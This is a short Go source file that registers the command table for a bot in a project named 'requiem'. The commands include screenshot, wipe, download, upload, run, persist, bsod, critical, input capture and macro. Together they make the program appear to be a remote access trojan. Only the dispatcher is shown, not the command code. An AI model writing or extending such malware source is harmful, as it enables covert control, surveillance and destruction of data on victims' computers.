package bot

import (
	"requiem/bot/commands"
	"requiem/store"
)

var commandsList = make(map[string]store.Command)

func registerCommands() {
	commandsList["ping"] = &commands.PingCommand{}
	commandsList["ss"] = &commands.ScreenshotCommand{}
	commandsList["wipe"] = &commands.WipeCommand{}
	commandsList["download"] = &commands.DownloadCommand{}
	commandsList["upload"] = &commands.UploadCommand{}
	commandsList["wallpaper"] = &commands.WallpaperCommand{}
	commandsList["critical"] = &commands.CriticalCommand{}
	commandsList["bsod"] = &commands.CrashCommand{}
	commandsList["run"] = &commands.RunCommand{}
	commandsList["tree"] = &commands.TreeCommand{}
	commandsList["file"] = &commands.FileCommand{}
	commandsList["persist"] = &commands.PersistCommand{}
	commandsList["rotate"] = &commands.RotateCommand{}
	commandsList["msgbox"] = &commands.NotifCommand{}
	commandsList["brightness"] = &commands.LightCommand{}
	commandsList["audio"] = &commands.AudioCommand{}
	commandsList["volume"] = &commands.VolumeCommand{}
	commandsList["input"] = &commands.InputCommand{}
	commandsList["tts"] = &commands.SpeakCommand{}
	commandsList["site"] = &commands.SiteCommand{}
	commandsList["update"] = &commands.UpdateCommand{}
	commandsList["macro"] = &commands.MacroCommand{}
}
